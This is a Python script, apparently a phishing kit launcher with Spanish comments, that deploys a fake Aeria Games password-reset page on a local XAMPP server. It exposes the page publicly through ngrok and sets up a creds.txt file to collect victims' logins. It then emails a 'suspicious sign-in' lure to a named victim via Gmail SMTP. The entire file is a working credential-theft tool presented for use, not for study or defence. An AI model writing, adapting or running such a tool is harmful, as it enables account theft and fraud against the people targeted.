# coding=utf-8
import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options
from data.gf import *

import smtplib, ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase

from knockknock import email_sender


def gf():
    
    #VARIABLES ESENCIALES
    CHROMEDRIVER_PATH = "chromedriver.exe"
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')  # Last I checked this was necessary.
    driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=options)

    xampp_path = "C:\\xampp\\htdocs\\aeriagames\\"

    #COMPROBACIÓN DE LA EXISTENCIA DE LA CARPETA
    if os.path.isdir(xampp_path):

        os.system("rd /S C:\\xampp\\htdocs\\aeriagames\\")

        print("[*]Borrando archivos[*]")
        
        os.system("cd C:\\xampp\\htdocs\\ && mkdir aeriagames\\reset_password\\img")
        
        os.system('copy "img\\" "C:\\xampp\\htdocs\\aeriagames\\reset_password\\img"')
        
    else:

        os.system("cd C:\\xampp\\htdocs\\ && mkdir aeriagames\\reset_password\\img")
        
        os.system('copy "img\\" "C:\\xampp\\htdocs\\aeriagames\\reset_password\\img"')


    #PEDIR DATOS
    Username = input("     "+"["+"Username"+"]"+": ")


    #SUSTITUCION DE DATOS
    filedata = str(main_gf)
    filedata = filedata.replace('[name]', str(Username))
    

    #SUSTITUIR DATOS DE LA CARPETA DATA Y PASARLOS AL SERVIDOR
    with open('C:\\xampp\\htdocs\\aeriagames\\reset_password\\index.html', 'w') as file:
        file.write(filedata.encode('utf8').decode('ascii', 'ignore'))
    file.close()


    logindata = str(Login_Instagram)

    with open('C:\\xampp\\htdocs\\aeriagames\\reset_password\\login.php', 'w') as file:
        file.write(logindata.encode('utf8').decode('ascii', 'ignore'))
    file.close()

    secured_html = str(account_secured)
    secured_html = secured_html.replace('[name]', str(Username))

    with open('C:\\xampp\\htdocs\\aeriagames\\reset_password\\account_secured.html', 'w') as file:
        file.write(secured_html.encode('utf8').decode('ascii', 'ignore'))
    file.close()


    #CREAR EL ARCHIVO DE CREDENCIALES
    os.system("type nul > C:\\xampp\\htdocs\\aeriagames\\reset_password\\creds.txt")

    os.system("cd C:\\xampp\\htdocs\\aeriagames\\reset_password\\ & echo php -S 127.0.0.1:80>server.bat & start server.bat")

    time.sleep(2)

    #lanzar ngrok
    os.system("start ngrok-server.bat")

    br = driver
    br.get("http://localhost:4040/status")

    time.sleep(4)

    url_f = str(driver.find_element(By.XPATH, '//div[@id="app"]/div[1]/div[1]/div[1]/div[1]/div[1]/ul[1]/li[1]/div[1]/table[1]/tbody[1]/tr[1]/td[1]').text)

    phish_url = str(url_f+"/aeriagames/reset_password/")
    print(phish_url)

    url_phish = str(correo)
    url_phish = url_phish.replace('[url]', str(phish_url))
    url_phish = url_phish.replace('[name]', str(Username))
    
    with open('C:\\xampp\\htdocs\\aeriagames\\reset_password\\correo.html', 'w') as file:
        file.write(url_phish.encode('utf8').decode('ascii', 'ignore'))
    file.close()

    #LEER EL ARCHIVO DE CREDDENCIALES LINEA A LINA PARA MOSTRARLO
    fichero_cedenciales = open("C:\\xampp\\htdocs\\aeriagames\\reset_password\\creds.txt", "r")

    #
    #while(True):
    #
    #    linea = fichero_cedenciales.readline()
    #    print(linea)
    #    if not linea:
    #        break
    #
    #fichero_cedenciales.close()

    try:
        
        sender_email = input("     "+"["+"Introduce tu correo"+"]"+": ")
        receiver_email = input("     "+"["+"Introduce el correo de la victima"+"]"+": ")
        password = input("     "+"["+"Introduce la contraseña de tu email"+"]"+": ")

        message = MIMEMultipart("alternative")
        message["Subject"] = "Inicio de sesión sospechoso"
        message["From"] = sender_email
        message["To"] = receiver_email

        # Create HTML version of your message
        html = url_phish

        # Turn these into plain/html MIMEText objects
        part2 = MIMEText(html, "html")

        # Add HTML/plain-text parts to MIMEMultipart message
        # The email client will try to render the last part first
        message.attach(part2)

        # Create secure connection with server and send email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(
                sender_email, receiver_email, message.as_string()
            )

    except Exception:
        print("[!]ERROR INESPERADO[!]")

gf()
